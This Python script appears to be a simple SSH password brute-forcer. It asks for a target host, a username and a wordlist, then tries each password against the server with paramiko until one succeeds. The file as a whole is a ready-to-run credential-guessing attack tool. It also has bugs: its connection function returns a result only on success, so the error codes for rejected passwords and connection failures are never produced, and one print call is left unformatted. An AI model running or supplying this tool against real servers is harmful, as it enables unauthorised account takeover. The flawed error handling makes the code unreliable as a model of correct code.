import paramiko, sys, os, socket
"""
import warnings
with warnings.catch_warnings():
    warnings.filterwarnings("ignore", module='.*paramiko.*')
	#warnings.simplefilter("ignore", cryptography.utils.DeprecatedIn23)
"""
g_host = g_user_name = g_word_list = ""
line = "\n------------------------------------------------------\n"
SSH_PORT = 22

# get the details of the SSH server from the user
def get_target_details():
	try:
		global g_host, g_user_name, g_word_list
		g_host = input("[*] Enter target's address: ")
		g_user_name = input("[*] Enter the SSH username to bruteforce: ")
		g_word_list = input("[*] Enter the path of the password-list: ")

		if (os.path.exists(g_word_list) == False):
			print("\n[*] Wordlist file does not exist at given path")
			sys.exit(1)

	except KeyboardInterrupt:
		print("\n [*] Program has been interrupted at your request")
		sys.exit(2)

# "\n------------------------------------------------------\n"

def test_get_details():
	print("IP: ", g_host)
	print("User: ", g_user_name)
	print("path: ", g_word_list)

	print("\n-----word list contents-----")
	wrd_lst = open(g_word_list, "r")

	for password in wrd_lst.readlines():
		password = password.strip("\n")
		print(password)

# connect to the SSH server with the password passed as arg
def connect_ssh(password):
	global g_host, g_user_name, g_word_list

	# create a new SSH client
	client_ssh = paramiko.SSHClient()

	# policy for automatically adding the hostname and new host key to the local HostKeys object, and saving it.
	client_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# connect to the host with password retreived from the word list
	try:
		client_ssh.connect(g_host, SSH_PORT, g_user_name, password)
		code = 0	# successful connection

	except paramiko.AuthenticationException:
		code = 1	# invalid credentials

	except paramiko.SSHException:
		code = 2	# error in connecting or establishing an ssh connection

	except socket.error:
		code = 3	# socket error while connecting

	else:
		client_ssh.close()
		return code


def ssh_brute_forcer_simple():
	global g_host, g_user_name, g_word_list

	# open the file containing the passwords to try
	file_words = open(g_word_list)

	# read each password from the file_words
	for password in file_words.readlines():
		password = password.strip("\n")

		try:
			response = connect_ssh(password)

			if (response == 0):
				print("{0}[*] Password found\n[*] Password: {1} {0}".format(line, password))
				sys.exit(0)

			elif (response == 1):
				print("[*] Incorrect password: {0} \n", password)

			elif (response == 2):
				print("[*] Unable to establish a connection to the target\n")
				sys.exit(2)

			elif (response == 3):
				print("socket.error")
				sys.exit(3)

		except KeyboardInterrupt:
			print("\n [*] Program has been interrupted at your request")
			sys.exit(2)

		except Exception as e:
			print(e)
			sys.exit(3)


	# no passwords matched
	file_words.close()
	print("No passwords matched")


def main():
	get_target_details()
	#test_get_details()
	ssh_brute_forcer_simple()

if __name__ == "__main__":
	main()